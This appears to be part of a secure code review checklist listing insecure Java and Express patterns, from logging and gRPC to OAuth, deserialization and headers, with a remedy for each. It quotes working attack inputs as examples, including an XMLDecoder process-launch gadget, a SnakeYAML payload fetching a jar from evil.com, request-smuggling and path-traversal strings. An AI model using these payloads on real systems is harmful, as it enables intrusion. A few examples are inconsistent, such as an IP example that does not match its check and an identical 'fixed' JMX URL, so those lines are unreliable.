- **Audit write failure silently swallowed:** `catch (IOException e) { logger.warn(...); }` — no alert, no fallback. Must alert on audit integrity failure.
- **Log injection via user input in message:** `logger.info("User: {} did {}", username, action)` where username contains `\n` — forges fake log entries. Must sanitize `\r` and `\n` from all user data in log messages.
- **CRLF injection in structured logs:** `String.format("[%s] %s", timestamp, userInput)` — attacker injects newlines to create fake structured log lines. Strip control characters.
- **PII in log messages:** `logger.info("Payment: card={}", cardNumber)` — full credit card numbers, SSNs, emails in plaintext. Must mask: `cardNumber.replaceAll("\\d(?=\\d{4})", "*")`.
- **Password/token in logs:** `logger.debug("Auth with password: {}", password)` — credentials in persistent storage. Never log passwords, tokens, or secrets at any level.
- **Environment variables in logs:** `logger.info("Env: {}", System.getenv())` — dumps DB_PASSWORD, API_KEY, all secrets. Flag any `System.getenv()` in log statements.
- **Exception with request params in log:** `logger.error("Error: params={}", requestParams, e)` — full request body including passwords in error logs. Must strip sensitive fields before logging.
- **No log rotation:** Single audit file grows unbounded — disk exhaustion. Must configure log rotation by size or time in logback.xml/log4j2.xml.
- **No log integrity protection:** Audit log is mutable plaintext — attacker with filesystem access can delete/modify entries. Must have HMAC chaining or append-only storage.
- **Log level enforcement absent:** Debug logging in production — exposes internal state. Must set minimum level to INFO or WARN in production config.
- **System.out.println for logging:** Bypasses logging framework — no levels, no appender, no SIEM. Flag any `System.out` or `System.err` in service code.

### gRPC / Inter-Service Security (Java)

- **No TLS on gRPC server:** `ServerBuilder.forPort(9090)` without `useTransportSecurity()` — all RPC calls in plaintext over the network. Must use TLS with mutual auth for internal services.
- **ProtoReflectionService enabled in production:** `addService(ProtoReflectionService.newInstance())` — exposes all service methods, message types, and field names to any caller via gRPC reflection. Attacker enumerates entire API surface. Must disable in production.
- **No authentication interceptor:** gRPC service accepts all calls without verifying caller identity — any internal service or compromised pod can invoke any RPC. Must validate auth tokens/metadata in a `ServerInterceptor`.
- **Non-constant-time auth token comparison:** `AUTH_TOKEN.equals(metadataToken)` — timing attack leaks token byte-by-byte. Must use `MessageDigest.isEqual()`.
- **Auth check doesn't block:** Token validation logs a warning but proceeds regardless — auth is a no-op. Flag when auth failure doesn't return `Status.UNAUTHENTICATED`.
- **Logging auth tokens in error messages:** `logger.warning("Invalid auth token: " + token)` — secrets in persistent logs. Never log raw tokens.
- **Hardcoded inter-service auth token:** `private static final String AUTH_TOKEN = "grpc-internal-2024"` — secret in source code. Must come from env or secrets manager.
- **No deadline on RPC calls:** Every gRPC call should have a `withDeadline()` — without it, a slow downstream service blocks the calling thread indefinitely. Flag bare RPC calls without deadline.
- **No maxInboundMessageSize:** Default gRPC message limit is 4MB — may be too large for the service. Must set `maxInboundMessageSize()` appropriate to the API. Missing limit is a DoS vector.
- **No maxInboundMetadataSize:** Headers/metadata unbounded — attacker sends multi-MB metadata exhausting memory. Flag absence.
- **Unbounded thread pool:** `Executors.newCachedThreadPool()` for gRPC executor — creates unlimited threads under load, OOM. Must use bounded pool or `fixedThreadPool`.
- **No keepalive configuration:** Missing `permitKeepAliveWithoutCalls`, `maxConnectionIdle`, `maxConnectionAge` — connections never recycled, zombie connections accumulate. Flag absence.
- **No maxConcurrentCallsPerConnection:** One connection can monopolize server — fair scheduling requires a per-connection cap. Flag absence.
- **SQL injection in gRPC handler:** `"SELECT * FROM payments WHERE user_id = '" + userId + "'"` — same injection risk as REST endpoints. Must use parameterized queries.
- **Server streaming without flow control:** `for (int i = 0; i < 10000; i++) responseObserver.onNext(record)` — server floods client with no backpressure. Must check `responseObserver.isReady()` and use `onReadyHandler`.
- **Client streaming without message count limit:** `onNext()` increments counter with no max — attacker sends millions of messages, OOM. Must enforce `maxInboundMessageSize` and track count.
- **Blocking calls in gRPC handler thread:** `Thread.sleep()` in `onNext`/`onCompleted` — blocks the gRPC event loop, starving other RPCs. Must dispatch to worker thread pool.
- **Auth token leaked in response:** Response proto includes `internal_auth_token` field — client receives server's internal credential. Never include secrets in response protos.
- **No graceful shutdown:** `server.shutdown()` without `awaitTermination(timeout)` — in-flight RPCs killed mid-execution, data corruption. Must drain in-flight calls.
- **Hollow health check:** `isHealthy()` always returns `true` — defeats readiness/liveness probe purpose. Must check actual dependencies (DB, Kafka, downstream services).

### Kafka / Message Broker Security (Java)

- **PLAINTEXT connection:** `bootstrap.servers=localhost:9092` without SSL/SASL config — all messages and credentials in cleartext on the network. Must use `security.protocol=SSL` or `SASL_SSL`.
- **Hardcoded SASL credentials:** `SASL_PASSWORD = "kafka-admin-secret-2024"` in source — broker credentials visible to anyone with repo access. Must use env vars or vault.
- **Unsafe deserialization on message payload:** `new ObjectInputStream(...).readObject()` on Kafka message value — classic Java deserialization RCE. Attacker publishes gadget chain payload to Kafka topic. Must use `StringDeserializer`, Avro, or `ValidatingObjectInputStream` with class allowlist.
- **Producer fire-and-forget:** `producer.send(record)` without calling `.get()` on the returned `Future` — send errors silently dropped. Must check result or provide a `Callback`.
- **No idempotence:** `enable.idempotence=false` (default) — retried sends produce duplicate messages. Must enable `enable.idempotence=true` for exactly-once semantics.
- **acks=1 (default):** Only leader acknowledges — message lost if leader fails before replication. Must use `acks=all` for critical data.
- **No schema validation:** Plain string messages without Avro/Protobuf schema — malformed messages cause runtime errors downstream. Must use `KafkaAvroSerializer` with schema registry.
- **Consumer auto-commit enabled:** `enable.auto.commit=true` (default) — offsets committed even if message processing fails. Messages permanently lost on crash. Must disable and commit manually after processing.
- **auto.offset.reset=latest (default):** Consumer starts from latest offset on first connect — all existing messages skipped. Can cause silent data loss. Flag for consumers that need to process all messages.
- **Consumer group ID from untrusted input:** `new KafkaConsumer(props, userProvidedGroupId)` — attacker can join any consumer group, stealing partitions. Must validate or hardcode group IDs.
- **No dead-letter queue:** Failed messages silently swallowed — no replay, no alert, no audit trail. Must send failures to a dead-letter topic with original metadata.
- **Dead letter replay without poison message detection:** Replay loop re-processes failing messages indefinitely — CPU/IO exhaustion. Must track retry count per message and route to a poison queue after N failures.
- **No message signing/HMAC:** Messages published without integrity protection — any producer can inject forged messages. Must sign with HMAC or use mutual TLS authentication.
- **No idempotency key in message:** `publishOrderEvent(topic, orderJson)` without dedup key — retries or replay produce duplicate side effects. Must include a unique event ID and deduplicate on consumption.
- **Shared mutable state across consumers:** `static List<String> deadMessages = new ArrayList<>()` updated from multiple threads without synchronization — data corruption. Must use `ConcurrentLinkedQueue` or synchronized block.
- **Admin operations without authorization:** `deleteTopic(userTopic)` — any caller can delete topics. Must require admin credentials and audit logging.
- **Command injection via topic name:** `Runtime.exec("kafka-topics.sh --delete --topic " + topic)` — user-controlled topic name injected into shell command. Must use `KafkaAdminClient` API, never shell out.
- **No consumer session timeout:** Default `session.timeout.ms` may be too long — slow detection of dead consumers, delayed rebalancing. Must tune to expected processing latency.

### Spring Actuator Security (Java)

- **Health indicator exposes DB URL/credentials:** `details.put("dbUrl", "jdbc:mysql://prod-db.internal:3306/ecommerce")` — full database network path and credentials in health endpoint, accessible to any unauthenticated caller. Flag every health detail that includes hostnames, ports, or credential info.
- **Health indicator exposes internal infrastructure:** `details.put("redis.host", "redis-prod.internal")`, `kafka.brokers` — maps out internal network topology for attackers. Must redact hostnames from health output.
- **Health indicator exposes schema info:** `details.put("lastMigrationFile", "V42__add_credit_card_table.sql")` — reveals database schema evolution to attackers. Flag migration file names in health details.
- **No health check timeout:** Health indicator calls DB/external service without timeout — liveness/readiness probes hang indefinitely, Kubernetes kills healthy pod. Must set connect + query timeouts.
- **System health exposes OS details:** `System.getProperty("os.name")`, `os.version`, `java.version`, `java.vendor` in health output — aids attacker in selecting OS/JVM-specific exploits. Flag system property exposure.
- **System health exposes user home/dir:** `System.getProperty("user.home")`, `user.dir` — reveals filesystem layout, username, and project structure. Flag these properties in health endpoints.
- **System health exposes JVM args:** `ManagementFactory.getRuntimeMXBean().getInputArguments()` — command-line arguments may contain `-Ddb.password=xxx` or other secrets. Flag JVM argument exposure.
- **System health exposes memory details:** `Runtime.freeMemory()`, `totalMemory()`, `maxMemory()` — heap sizing info aids GC-based timing attacks. Flag detailed memory metrics in public health endpoints.
- **System health leaks environment variables:** `System.getenv("JAVA_HOME")`, `System.getenv("PATH")`, `System.getenv("HOME")` — may include sensitive paths. Flag any `System.getenv()` in health output.
- **InfoContributor exposes API keys:** `info.put("integrations.stripe.key", "sk_live_prod_...")` — live production API keys visible in `/actuator/info`. Catastrophic. Flag every instance of a key/token/secret in `InfoContributor.withDetails()`.
- **InfoContributor exposes internal hostnames/ports:** `database.host: prod-db.internal:3306`, `redis.host`, `kafka.brokers` — network topology map for attackers. Flag internal addressing info in actuator info.
- **All actuator endpoints public:** `requestMatchers(EndpointRequest.toAnyEndpoint()).permitAll()` — heap dump, env, configprops, thread dump, shutdown ALL accessible without authentication. Must require admin role.
- **No CORS/rate limiting on actuator:** Actuator endpoints lack the defense-in-depth that REST endpoints have — exploit surface. Flag when actuator security config omits CORS, rate limiting, IP restrictions.
- **getEnv() dump endpoint:** `System.getenv().forEach((k, v) -> map.put(k, v))` — exposes ALL environment variables including `DB_PASSWORD`, `JWT_SECRET`, `AWS_SECRET_KEY`. Flag any endpoint returning the full environment variable map.
- **getSystemProperties() dump:** `System.getProperties().forEach(...)` — exposes all JVM properties including potentially sensitive `-D` flags. Flag system property dump endpoints.
- **Missing spring-boot-starter-actuator dependency with actuator code present:** Actuator config classes exist in codebase but `spring-boot-starter-actuator` not in pom.xml/build.gradle — may indicate an incomplete/untested security configuration. Flag.

### API Key Lifecycle Management (Java)
...
### JMX / RMI Security (Java)

- **Hardcoded JMX credentials:** `JMX_USERNAME = "admin"`, `JMX_PASSWORD = "jmx_p@ssw0rd_2024!"` in source — anyone with repo access gets JMX admin. Must use externalized config or vault.
- **JMX authentication disabled:** `com.sun.management.jmxremote.authenticate=false` — any remote process can connect and invoke MBean operations. Must enable authentication with password file and access file.
- **JMX SSL disabled:** `com.sun.management.jmxremote.ssl=false` — all JMX traffic in cleartext, including credentials and MBean data. Must enable SSL with proper keystore/truststore.
- **RMI registry without SSL:** `LocateRegistry.createRegistry(1099)` without SSL context — plaintext RMI exposes JMX connector. Must use `LocateRegistry.createRegistry(port, clientSocketFactory, serverSocketFactory)` with SSL factories.
- **JMXServiceURL with plaintext protocol:** `service:jmx:rmi:///jndi/rmi://host:1099/jmxrmi` — no encryption on the wire. Must use `service:jmx:rmi:///jndi/rmi://host:1099/jmxrmi` with SSL RMI socket factories.
- **No JMXAuthenticator:** `JMXConnectorServerFactory.newJMXConnectorServer()` without `JMXConnectorServer.AUTHENTICATOR` in environment — any remote caller can connect. Must provide a custom `JMXAuthenticator` implementation.
- **JMX credentials in environment Map:** `env.put(JMXConnectorServer.AUTHENTICATOR, new HashMap<>() {{ put(user, pass) }})` — credentials logged in JMX connection error messages. Must use a proper `JMXAuthenticator` that reads from secure storage.
- **ManagedOperation exposes JVM shutdown:** `@ManagedOperation public void shutdownJvm() { System.exit(0); }` — any JMX client can kill the JVM. Must require authentication/authorization on destructive operations.
- **ManagedOperation exposes environment dump:** `@ManagedOperation public Map<String, String> dumpEnvironment()` returning `System.getenv()` — leaks all secrets (DB_PASSWORD, API_KEY, JWT_SECRET). Never expose environment variables via JMX.
- **ManagedOperation with SQL injection:** `@ManagedOperation public String updateProductPrice(String productId, double price)` concatenating `productId` into SQL — JMX becomes SQL injection vector. Must use parameterized queries.
- **ManagedOperation without authorization:** Any `@ManagedOperation` that mutates state or exposes sensitive data without checking caller credentials. Flag every destructive MBean operation without auth.
- **RMI codebase class loading attack:** `java.rmi.server.codebase` set to any URL + `java.rmi.server.useCodebaseOnly=false` — attacker-specified codebase downloads and executes arbitrary classes (RCE). Must never set `useCodebaseOnly=false` in production.
- **Thread dump via JMX without auth:** `ManagementFactory.getThreadMXBean().dumpAllThreads(true, true)` accessible via `@ManagedOperation` — exposes thread stacks, lock holders, internal service names. Must restrict to authenticated admin sessions.

### Thread Pool / Executor Safety (Java)

- **Unbounded cached thread pool:** `Executors.newCachedThreadPool()` — creates unlimited threads under load, OutOfMemoryError. Must use bounded `ThreadPoolExecutor` with max pool size and bounded queue.
- **ForkJoinPool without parallelism control:** `new ForkJoinPool()` (default = all CPU cores) — one rogue service consumes all CPU. Must specify explicit parallelism appropriate to the workload.
- **Static mutable collection shared across threads:** `static List<String> results = new ArrayList<>()` accessed from multiple threads without synchronization — data corruption, lost updates, ConcurrentModificationException. Must use `ConcurrentLinkedQueue`, `CopyOnWriteArrayList`, or synchronized access.
- **ThreadPoolExecutor with unbounded queue:** `new ThreadPoolExecutor(core, max, keepAlive, unit, new LinkedBlockingQueue<>())` — queue grows unbounded, OOM under backlog. Must use bounded queue like `ArrayBlockingQueue` or `LinkedBlockingQueue(capacity)`.
- **No RejectedExecutionHandler configured:** `ThreadPoolExecutor` without explicit handler — default `AbortPolicy` throws `RejectedExecutionException` silently, lost tasks. Must configure `CallerRunsPolicy`, `DiscardOldestPolicy`, or a custom handler with logging.
- **CompletableFuture without timeout:** `CompletableFuture.supplyAsync(() -> ...)` without `.orTimeout()` or `.completeOnTimeout()` — hangs indefinitely if the supplier blocks. Must set explicit timeout with fallback.
- **Blocking I/O in common ForkJoinPool:** `CompletableFuture.supplyAsync(() -> { Thread.sleep(5000); })` — `supplyAsync` without explicit executor uses `ForkJoinPool.commonPool()`, starving other async tasks. Must pass a dedicated executor for blocking operations.
- **InterruptedException swallowed without restoring flag:** `catch (InterruptedException e) { return; }` — thread interrupt status lost, callers can't detect cancellation. Must call `Thread.currentThread().interrupt()` in every InterruptedException catch block.
- **@Async void — exceptions silently swallowed:** Spring's `SimpleAsyncUncaughtExceptionHandler` logs and discards exceptions from void `@Async` methods. No error propagation to caller. Must use `Future<?>` return type or configure a custom `AsyncUncaughtExceptionHandler`.
- **Non-atomic increment on shared field:** `static int counter; ... return ++counter;` — read-modify-write is not atomic, lost updates under concurrent access. Must use `AtomicInteger` or `synchronized` block.
- **volatile on array — element access not synchronized:** `volatile String[] cache = new String[10]; ... return cache[i];` — `volatile` only ensures reference visibility, not element visibility. Array elements accessed without synchronization may see stale values.
- **Double-checked locking without proper volatile:** `if (instance == null) { synchronized { if (instance == null) { instance = new ... } } }` — even with `volatile`, the unsynchronized read can see partially-constructed object on some JVMs. Prefer `static final` holder class or enum singleton.
- **ThreadLocal not removed in thread-pooled environment:** `threadLocal.set(value)` in `try` without `threadLocal.remove()` in `finally` — value leaks to next request reusing the same thread. Must always remove in finally block.
- **ScheduledExecutorService without shutdown hook:** `Executors.newScheduledThreadPool(4)` assigned to static field — leaked on JVM exit, prevents graceful shutdown. Must register shutdown hook: `Runtime.getRuntime().addShutdownHook(new Thread(pool::shutdown))`.
- **Scheduled task without exception handling:** `scheduler.scheduleAtFixedRate(() -> { doWork(); }, 0, 30, SECONDS)` — one uncaught exception kills the periodic task permanently. Must wrap task body in try-catch that logs and continues.
- **Static mutable collection repopulated without synchronization:** `SHARED_LIST.clear(); SHARED_LIST.addAll(newData);` — concurrent readers between `clear()` and `addAll()` see an empty list. Must use atomic reference swap: `SHARED_REF.set(Collections.unmodifiableList(newData))`.

### Protocol-Level Validation (Java/HTTP)

- **IP allowlist with String.startsWith:** `if (ip.startsWith("192.168.1."))` — `192.168.1.100` starts with `192.168.1.10`, bypass intended CIDR check. Must parse IP as `InetAddress` and check subnet via prefix length.
- **X-Forwarded-For trusted without proxy validation:** Taking client IP from `X-Forwarded-For` header without verifying the immediate proxy is in a trusted proxy list — attacker sends any IP. Must accept only when `request.getRemoteAddr()` is a known proxy.
- **Only checks X-Forwarded-For — misses RFC 7239 Forwarded:** Modern proxies (HAProxy, Traefik, Envoy) use `Forwarded: for=client` header, not `X-Forwarded-For`. Must parse both headers, preferring RFC 7239.
- **DNS rebinding — hostname resolved once:** `InetAddress.getByName(host)` cached result without re-resolving on each request — attacker changes DNS record between initial resolution and subsequent access. Must resolve on every security-sensitive operation or validate against IP allowlist post-resolution.
- **Content-Length with NumberFormatException not caught:** `Long.parseLong(request.getHeader("Content-Length"))` without try-catch — attacker sends `Content-Length: abc` causing unhandled exception, 500 error reveals framework. Must catch `NumberFormatException` and reject with 400.
- **Multiple Content-Length headers — request smuggling:** Sending duplicate `Content-Length` headers with different values — frontend and backend disagree on body length (CL.CL smuggling). Must reject requests with duplicate Content-Length headers.
- **Transfer-Encoding + Content-Length both present — TE.CL smuggling:** Frontend uses `Transfer-Encoding: chunked`, backend uses `Content-Length` — attacker smuggles hidden request in chunked body. Must reject requests with both headers present (RFC 7230 §3.3.3).
- **Negative Content-Length:** `Content-Length: -1` — bypasses size checks that test `> maxSize` (negative is always less). Must reject any `Content-Length < 0`.
- **Content-Length exceeding Integer.MAX_VALUE:** `Content-Length: 9999999999` — overflows `int` parsing, wraps to negative or zero, bypasses size limits. Must use `long` for Content-Length and cap at configured max.
- **Host header injection — attacker-controlled Host:** `request.getHeader("Host")` interpolated into redirects or URLs without validation — attacker sets `Host: evil.com` to poison redirects, password reset links, or cache keys. Must validate Host against configured domain allowlist.
- **Host header substring match bypass:** `if (host.contains("localhost"))` — `notlocalhost.evil.com` passes. Must use exact match or proper domain suffix check: `host.equals("localhost")` or `host.endsWith(".trusted.com")`.
- **Email regex with catastrophic backtracking (ReDoS):** `^([a-zA-Z0-9_+&*-]+(?:\.[a-zA-Z0-9_+&*-]+)*)@...` — nested quantifiers on crafted input (e.g., `a@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!`) cause exponential backtracking, CPU exhaustion. Must use linear-time regex or validator library without nested quantifiers.
- **Charset validation without allowlist:** Accepting `charset=gb2312`, `charset=x-IBM-037`, or unknown charsets — encoding confusion in downstream parsers, bypass of input validation. Must validate charset against an explicit allowlist: `UTF-8`, `US-ASCII`, `ISO-8859-1`.
- **Multipart boundary with CRLF injection:** `contentType.split("boundary=")[1]` without stripping `\r` and `\n` — attacker injects headers or extra body parts via boundary. Must strip CRLF from boundary value before use.
- **Range header with no bounds checking:** `Range: bytes=0-999999999999` — single range requests gigabytes. `Range: bytes=0-0,1-1,2-2,...` (10,000 ranges) — DoS via range flooding. Must limit number of ranges and total bytes per range request.
- **URL protocol whitelist includes file:// and jar://:** `isValidUrl(url)` allowing `file:///etc/passwd` or `jar://` — SSRF to local filesystem and classpath. Must restrict to `http://` and `https://` only for external-fetch use cases.
- **Path normalization naive — only removes ".." literal:** `path.replace("..", "")` — `"....//"` becomes `"//"` (still traversable), URL-encoded `%2e%2e/` not decoded, Unicode `..%c0%af` not decoded. Must canonicalize via `Path.normalize()` or `File.getCanonicalPath()` and verify the result.
- **Duplicate header handling inconsistency:** `request.getHeader(name)` returns first value — but frontend and backend may disagree on which is "first" when headers are duplicated. Attacker exploits discrepancy between servers.
- **HashMap for concurrent access:** `new HashMap<>()` in singleton @Service — corrupts under concurrent read/write. Must use `ConcurrentHashMap`.
- **Weak key generation — insufficient entropy:** `"sk_" + Long.toHexString(new Random().nextLong())` — 48 bits of entropy, brute-forceable. Must use `SecureRandom` with minimum 128 bits (32 hex chars).
- **java.util.Random for key generation:** Not cryptographically secure — predictable after observing outputs. Must use `SecureRandom`.
- **Non-constant-time key lookup:** `Map.get(key)` — timing differs for hit vs miss. Attacker measures response time to enumerate valid keys. Must use `MessageDigest.isEqual()` on hashed keys after lookup.
- **Default wildcard scope:** `scopes = "*"` — new keys get unrestricted access. Must default to minimal scope, require explicit scope assignment.
- **No key expiry:** `expiresAt` nullable/absent — keys live forever. Must enforce `expiresAt` and reject expired keys on validation.
- **No key uniqueness check on generation:** 48-bit key space with no collision detection — two users can receive identical keys. Must check uniqueness + retry on collision.
- **Plaintext key logged on generation:** `logger.info("Generated key: {}", newKey)` — key in persistent logs forever. Must only show key prefix (first 4 chars) in logs.
- **Scopes as unvalidated String:** `scopes = "read,write"` — comma-separated with no enum, typos become security holes. Must parse and validate against known scope enum.
- **Key rotation with no overlap window:** `keyStore.remove(oldKey); keyStore.put(newKey, ...)` — in-flight requests fail. Must support grace period where both old and new key are valid.
- **Rotation without audit log:** No record of who rotated the key or when — untraceable. Must log rotation with operator identity and timestamp.
- **Revocation without audit trail:** `keyStore.remove(key)` with no metadata — no record of who/when/why. Must log revocation as an auditable event.
- **List all keys without ownership filter:** Iterates entire keyStore — any caller sees all users' keys. Must filter by authenticated user ID or require admin role.
- **List user keys without authorization:** `listUserKeys(userId)` — any caller can enumerate any user's keys. Must verify caller is the user or admin.
- **Empty result indistinguishable from no user:** Returns empty list for both "user has no keys" and "user doesn't exist" — user enumeration oracle.
- **Scope check via String.contains():** `scopes.contains("read")` matches `"readwrite"` — false positive. Must parse scopes and check exact or hierarchical match.
- **No scope hierarchy:** `"admin"` scope doesn't inherit `"read"` and `"write"` — must duplicate scopes. Must define scope hierarchy: admin ⊃ write ⊃ read.
- **API key in URL query parameter:** `req.getParameter("api_key")` — key appears in proxy logs, browser history, Referer headers. Must only accept via `Authorization` header.
- **SHA-256 for key hashing:** Too fast — GPU can brute-force billions/second. Must use bcrypt/scrypt/argon2 with work factor.
- **Fallback to plaintext on hash algorithm unavailable:** `try { MessageDigest.getInstance("SHA-256") } catch { return key; }` — catastrophic failure mode. Must throw, never fall back to plaintext.
- **No brute-force protection on validation:** No rate limiting, no account lockout after N failed attempts. Attacker can brute-force keys indefinitely.
- **Partial key prefix lookup:** `key.startsWith(prefix)` iterating key store — enables key enumeration. Must not support partial-key queries.
- **No usage tracking:** `lastUsed`, `requestCount` not updated on validation — can't detect compromised keys or anomalous usage. Must update metadata on each validated request.

### Web / HTTP (cross-language)
- **Missing webhook signature verification:** Any webhook endpoint that processes events without verifying HMAC signatures.
- **Webhook idempotency missing:** No deduplication for webhook events — retries cause duplicate side effects.
- **SSRF in URL fetching:** Any HTTP client call where the target URL is user-controlled without host/port allowlisting.
- **Path traversal in file serving:** Any filesystem read/write where the path is user-influenced without canonicalization and bounds checking.

## JavaScript (Node.js utility / CLI)

- **Static mutable state:** Module-level `Map`/`Set` growing unbounded, shared across requests.
- **Undocumented behavior:** `Math.max(1, ...)` clamp without comment explaining the floor.
- **Intentional empty catches without comments:** Fine in hook code that must never crash, but needs a comment explaining why.

### Payment / Financial Safety (Java)
- **Amount from client without server-side recalculation:** `processPayment(orderId, amount, ...)` where `amount` is from the request body — attacker changes $100 to $0.01. Always recalculate from order items: sum of (item.price × item.quantity). Flag any payment endpoint that accepts amount from untrusted input.
- **Idempotency key stored AFTER operation:** `if (store.containsKey(key)) return cached; ... doPayment(); store.put(key, result)` — race window between check and store. Two concurrent requests both check (miss), both doPayment (double charge). Must use atomic put-if-absent (`putIfAbsent`, `SETNX`, DB unique constraint). Flag sequential check-then-put idempotency patterns.
- **Idempotency key cross-user collision:** `idempotencyStore.get(key)` returns result without verifying it belongs to the requesting user/order. User A's payment result returned to User B. Must scope idempotency keys per user/order. Flag when idempotency lookup ignores ownership.
- **Compensation transaction missing:** Balance deducted → payment gateway call fails → no rollback. User charged but order not paid. Must wrap in transaction with compensation: deduct balance AND charge gateway atomically, or roll back balance on gateway failure. Flag any multi-step payment flow without compensation logic.
- **PCI DSS logging violations:** `logger.info("Payment: amount={}, card={}", amount, cardNumber)` — logs full payment details including sensitive fields. Never log card numbers, CVV, full PAN. Flag every log statement in payment paths that includes amount + user/order identifiers without masking.
- **Overdraft not checked:** `user.setBalance(user.getBalance() - amount)` without checking `newBalance >= 0`. Users go arbitrarily negative. Flag balance deductions without overdraft guard.
- **Currency not validated:** `currency` parameter accepted as arbitrary string. Attacker sends `currency=XYZ` causing downstream calculation failures. Must validate against ISO 4217 allowlist. Flag currency parameters without validation.
- **Refund without original payment verification:** `refund(orderId, amount)` without checking that the order was actually paid, or that `amount <= originalPayment.amount`. Attacker refunds never-paid orders or refunds more than was charged. Flag any refund method that doesn't verify the original transaction.
- **Partial capture without authorized total tracking:** `capturePartial(orderId, amount)` multiple times — sum of captures can exceed authorized amount. Must track `capturedSoFar` and reject when total exceeds authorization. Flag partial capture without running total enforcement.
- **Payment gateway over HTTP with API key in query param:** `http://gateway/charge?key=sk_live_xxx&amount=...` — API key in URL logged by proxies, load balancers, access logs. Must use HTTPS POST with `Authorization` header. Flag any payment gateway call using HTTP or query-param credentials.

### OAuth2 / OIDC Security (Java)
- **Non-crypto Random for OAuth state parameter:** `new Random().nextLong()` for `state` — predictable. Attacker pre-computes state value and forges CSRF on callback. Must use `SecureRandom`. Flag any OAuth `state` generation using non-cryptographic PRNG.
- **redirect_uri from user input without allowlist:** `String redirectUri = request.getParameter("redirect_uri")` used directly in auth URL construction. Attacker sets `redirect_uri=https://evil.com` — authorization code leaked. Must validate against a registered, pre-configured allowlist. Flag any OAuth redirect_uri that isn't validated against a stored set.
- **Missing PKCE (Proof Key for Code Exchange):** `authorization_code` grant without `code_challenge`/`code_verifier`. On mobile/SPA apps, authorization codes can be intercepted from the redirect. PKCE binds the code exchange to the original requester via SHA-256 challenge. Flag any `authorization_code` flow without PKCE parameters.
- **Auth code not marked as used:** `exchangeCodeForToken(code, ...)` without marking the code as consumed. Same auth code can be replayed multiple times. Must store used codes with TTL and reject on second use. Flag code exchange without one-time-use enforcement.
- **Refresh token without rotation:** `refreshAccessToken(refreshToken)` returns same `refreshToken` in response. Stolen refresh token grants indefinite access. Must issue new refresh token on each refresh and invalidate the old one. Flag refresh endpoints without token rotation.
- **Token introspection without authentication:** `GET /oauth/introspect?token=...` returns token validity to any caller. Attacker probes tokens to find valid ones. Must require resource server credentials (client_id + client_secret). Flag introspection endpoints without authentication.
- **Client secret comparison via String.equals():** `if (!CLIENT_SECRET.equals(requestSecret))` — short-circuits on first diff character. Timing attack enumerates the secret byte-by-byte. Must use `MessageDigest.isEqual()` or constant-time comparison. Flag any string equality check on OAuth secrets.
- **Scope from user input without allowlist:** `&scope=${requestScope}` in authorization URL — attacker requests `admin` scope beyond what the client is registered for. Must validate requested scopes against client's registered scopes. Flag scope parameters accepted from untrusted input without filtering.

### Java Deserialization (Security)
- **ObjectInputStream on untrusted data:** `new ObjectInputStream(new ByteArrayInputStream(userData)).readObject()` — classic Java deserialization RCE. Attacker sends gadget chain payload, `readObject()` executes attacker code. Must use `ValidatingObjectInputStream` (Apache IO) with class allowlist, or avoid Java serialization entirely. Flag every `ObjectInputStream` instantiation with externally-sourced data.
- **Jackson enableDefaultTyping:** `new ObjectMapper().enableDefaultTyping(NON_FINAL)` — allows polymorphic deserialization via `@class` property in JSON. Attacker sends `{"@class": "com.evil.Gadget", ...}` triggering RCE. Default typing should never be enabled in production. Flag every `enableDefaultTyping()` or `activateDefaultTyping()` call.
- **XMLDecoder:** `new XMLDecoder(inputStream).readObject()` — uses reflection to instantiate arbitrary beans from XML. Attacker sends `<java><object class="java.lang.ProcessBuilder"><array class="java.lang.String"><string>calc</string></array><void method="start"/></object></java>` — RCE. Never use XMLDecoder on untrusted XML. Flag every XMLDecoder instantiation.
- **SnakeYAML default constructor (CVE-2022-1471):** `new Yaml().load(userYaml)` — SnakeYAML's default constructor instantiates arbitrary classes from `!!` tags. Attacker sends `!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://evil.com/payload.jar"]]]]` — RCE. Must use `new Yaml(new SafeConstructor())` or `Constructor` with allowlist. Flag every `new Yaml()` without `SafeConstructor`.
- **Serialization to untrusted path:** `new ObjectOutputStream(new FileOutputStream(userFilename)).writeObject(state)` — user-controlled filename enables path traversal. Serialized data written to arbitrary filesystem location. Must canonicalize and validate the destination path. Flag every serialization output stream with user-influenced path.
- **serialVersionUID not declared:** Entity class implementing `Serializable` without explicit `serialVersionUID` — JVM auto-generates one based on class structure. If the class changes, the auto-generated UID changes, breaking deserialization silently. But worse: attacker can pre-compute the UID from a known class version. Always declare `private static final long serialVersionUID = 1L;`. Flag `Serializable` classes without explicit UID.
- **Exception messages revealing classpath:** `catch (ClassCastException e) { logger.error(e.toString()) }` — exception type and message reveal internal class names to attacker. Useful for gadget chain discovery. Flag deserialization error handlers that leak class names to responses or verbose logs.

### HTTP Security Headers (Express)
- **CSP unsafe-inline / unsafe-eval:** `script-src 'self' 'unsafe-inline' 'unsafe-eval'` — defeats XSS protection. Inline scripts and eval() execute even with CSP present. Flag every CSP policy containing these directives.
- **CSP wildcard directives:** `img-src *`, `connect-src *`, `frame-src *`, `media-src *` — allows resources from any domain. Data exfiltration via connect-src, clickjacking via frame-src, tracking pixels via img-src. Flag every CSP wildcard per directive.
- **Missing HSTS (Strict-Transport-Security):** No HSTS header — users can be MITM-downgraded from HTTPS to HTTP. Must set `max-age=31536000; includeSubDomains; preload` on HTTPS responses.
- **Missing X-Content-Type-Options:** `nosniff` not set — browser MIME-sniffs responses. Attacker uploads .jpg containing HTML/JS, browser executes it. Flag when header is absent.
- **Missing Referrer-Policy:** Full URLs leaked via Referer header to third parties. Sensitive tokens in URL query params (e.g., `?token=xxx`) sent cross-origin. Flag absence.
- **Missing Permissions-Policy:** All browser features unrestricted — camera, microphone, geolocation, USB. Flag absence.
- **Missing X-DNS-Prefetch-Control:** Browser prefetches DNS for all links. Attacker uses timing to verify internal hosts exist (DNS enumeration). Flag absence.
- **Missing Cross-Origin-Embedder-Policy (COEP):** Enables Spectre-style cross-origin resource inclusion attacks. Flag absence.
- **Missing Cross-Origin-Opener-Policy (COOP):** `window.opener` accessible — tab-napping: opened page replaces opener with phishing page. Flag absence.
- **Missing Cross-Origin-Resource-Policy (CORP):** API responses readable cross-origin via fetch() or `<script>` inclusion. Flag absence.
- **Missing Cache-Control on authenticated responses:** Sensitive data cached by browser/CDN. Must set `Cache-Control: private, no-store` on responses containing user data.
- **Missing Clear-Site-Data on logout:** Browser retains cookies, Cache, storage after logout. Must send `Clear-Site-Data: "cookies", "cache", "storage"`.
